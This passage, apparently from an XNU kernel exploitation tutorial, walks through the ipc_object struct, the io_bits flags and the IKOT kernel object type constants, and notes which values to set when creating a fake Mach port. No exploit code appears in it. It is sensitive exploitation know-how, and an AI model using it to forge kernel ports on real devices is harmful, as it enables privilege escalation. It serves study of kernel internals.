    &lt;span class=&quot;mi&quot;&gt;088&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    089:  * The ipc_object is used to both tag and reference count these two data
    090:  * structures, and (Noto Bene!) pointers to either of these or the
    091:  * ipc_object at the head of these are freely cast back and forth; hence
    092:  * the ipc_object MUST BE FIRST in the ipc_common_data.
    093:  * 
    094:  * If the RPC implementation enabled user-mode code to use kernel-level
    095:  * data structures (as ours used to), this peculiar structuring would
    096:  * avoid having anything in user code depend on the kernel configuration
    097:  * (with which lock size varies).
    098:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;099&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_object&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_object_bits_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;io_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;101&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_object_refs_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;io_references&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;102&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;lck_spin_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;io_lock_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;103&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The first field is &lt;strong&gt;io_bits&lt;/strong&gt;, the details about these bits can be found under &lt;strong&gt;osfmk/ipc/ipc_object.h&lt;/strong&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;124&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    125:  *	IPC steals the high-order bits from the kotype to use
    126:  *	for its own purposes.  This allows IPC to record facts
    127:  *	about ports that aren't otherwise obvious from the
    128:  *	existing port fields.  In particular, IPC can optionally
    129:  *	mark a port for no more senders detection.  Any change
    130:  *	to IO_BITS_PORT_INFO must be coordinated with bitfield
    131:  *	definitions in ipc_port.h.
    132:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;133&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;IO_BITS_PORT_INFO&lt;/span&gt;	&lt;span class=&quot;mh&quot;&gt;0x0000f000&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* stupid port tricks */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;134&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;IO_BITS_KOTYPE&lt;/span&gt;		&lt;span class=&quot;mh&quot;&gt;0x00000fff&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* used by the object */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;135&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IO_BITS_OTYPE&lt;/span&gt;		&lt;span class=&quot;mh&quot;&gt;0x7fff0000&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* determines a zone */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;136&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;IO_BITS_ACTIVE&lt;/span&gt;		&lt;span class=&quot;mh&quot;&gt;0x80000000&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* is object alive? */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;137&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;138&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;io_active&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IO_BITS_ACTIVE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;139&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;140&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;io_otype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IO_BITS_OTYPE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;141&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;io_kotype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IO_BITS_KOTYPE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;142&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;143&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;io_makebits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;active&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;otype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kotype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	\
    &lt;span class=&quot;mi&quot;&gt;144&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;active&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IO_BITS_ACTIVE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;otype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kotype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;145&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;146&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    147:  * Object types: ports, port sets, kernel-loaded ports
    148:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;149&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;IOT_PORT&lt;/span&gt;		&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;150&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOT_PORT_SET&lt;/span&gt;		&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;151&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOT_NUMBER&lt;/span&gt;		&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* number of types used */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;152&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The &lt;strong&gt;IO_BITS_ACTIVE&lt;/strong&gt; needs to be set to make sure the object is alive. The &lt;strong&gt;IO_BITS_OTYPE&lt;/strong&gt; specifies the object type. The &lt;strong&gt;IO_BITS_KOTYPE&lt;/strong&gt; field that determines what kind of port it is, whether it is a task port, or a clock port etc. While creating a fake port, you need to specify these values in the &lt;strong&gt;io_bits&lt;/strong&gt; field. A full list can be found under &lt;strong&gt;osfmk/kern/ipc_kobject.h&lt;/strong&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BUILD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXPORT_HDRS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kern&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_kobject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;091&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;092&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;IKOT_NONE&lt;/span&gt;				&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;093&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_THREAD&lt;/span&gt;				&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;094&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;IKOT_TASK&lt;/span&gt;				&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;095&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;IKOT_HOST&lt;/span&gt;				&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;096&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;IKOT_HOST_PRIV&lt;/span&gt;			&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;097&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;IKOT_PROCESSOR&lt;/span&gt;			&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;098&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;IKOT_PSET&lt;/span&gt;				&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;099&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;IKOT_PSET_NAME&lt;/span&gt;			&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;IKOT_TIMER&lt;/span&gt;				&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;101&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;IKOT_PAGING_REQUEST&lt;/span&gt;		&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;102&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;IKOT_MIG&lt;/span&gt;				&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;103&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;IKOT_MEMORY_OBJECT&lt;/span&gt;		&lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;104&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;IKOT_XMM_PAGER&lt;/span&gt;			&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;105&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;IKOT_XMM_KERNEL&lt;/span&gt;			&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;106&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;IKOT_XMM_REPLY&lt;/span&gt;			&lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;107&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_UND_REPLY&lt;/span&gt;			&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;108&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_HOST_NOTIFY&lt;/span&gt;		&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;109&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_HOST_SECURITY&lt;/span&gt;		&lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;110&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;IKOT_LEDGER&lt;/span&gt;				&lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;111&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_MASTER_DEVICE&lt;/span&gt;		&lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;112&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_TASK_NAME&lt;/span&gt;			&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;113&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_SUBSYSTEM&lt;/span&gt;			&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;114&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_IO_DONE_QUEUE&lt;/span&gt;		&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;115&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_SEMAPHORE&lt;/span&gt;			&lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;116&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_LOCK_SET&lt;/span&gt;			&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;117&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_CLOCK&lt;/span&gt;				&lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;118&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_CLOCK_CTRL&lt;/span&gt;			&lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;119&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_IOKIT_IDENT&lt;/span&gt;		&lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;120&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_NAMED_ENTRY&lt;/span&gt;		&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;121&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_IOKIT_CONNECT&lt;/span&gt;		&lt;span class=&quot;mi&quot;&gt;29&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;122&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_IOKIT_OBJECT&lt;/span&gt;		&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;123&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_UPL&lt;/span&gt;				&lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;124&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_MEM_OBJ_CONTROL&lt;/span&gt;		&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;125&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_AU_SESSIONPORT&lt;/span&gt;		&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;126&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_FILEPORT&lt;/span&gt;			&lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt;
